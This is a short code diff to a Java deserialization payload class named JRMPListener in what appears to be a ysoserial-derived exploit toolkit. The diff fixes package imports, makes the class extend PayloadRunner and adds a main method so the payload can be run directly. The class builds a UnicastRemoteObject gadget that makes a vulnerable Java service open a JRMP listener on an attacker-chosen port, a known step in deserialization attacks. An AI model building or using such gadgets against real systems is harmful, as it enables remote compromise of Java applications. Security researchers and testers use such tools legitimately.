@@ -6,10 +6,11 @@ import java.rmi.server.RemoteRef;
 import java.rmi.server.UnicastRemoteObject;
 
 import A.R.ysogate.payloads.ObjectPayload;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import sun.rmi.server.ActivationGroupImpl;
 import sun.rmi.server.UnicastServerRef;
 import A.R.ysogate.payloads.annotation.Authors;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Reflections;
 
 
 /**
@@ -34,7 +35,7 @@ import A.R.ysogate.payloads.util.Reflections;
 		"restriction"
 })
 @Authors({Authors.MBECHLER})
-public class JRMPListener implements ObjectPayload<UnicastRemoteObject> {
+public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
 
 	public UnicastRemoteObject getObject(final String command) throws Exception {
 		int jrmpPort = Integer.parseInt(command);
@@ -46,5 +47,9 @@ public class JRMPListener implements ObjectPayload<UnicastRemoteObject> {
 
 		Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
 		return uro;
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(JRMPListener.class, args);
 	}
 }
